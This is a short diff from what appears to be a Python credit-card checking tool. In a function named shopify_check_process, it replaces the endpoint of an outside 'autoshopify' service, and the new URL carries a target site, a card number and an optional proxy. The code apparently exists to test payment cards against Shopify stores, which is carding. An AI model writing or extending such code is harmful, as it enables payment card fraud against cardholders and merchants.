@@ -722,7 +722,7 @@ def shopify_check_process():
                     }
             
             # Prepare the API URL
-            api_url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}"
+            api_url = f"http://gxf.b9f.mytemp.website/autog.php?site={site}&cc={card}"
             if proxy:
                 api_url += f"&proxy={proxy}"
             
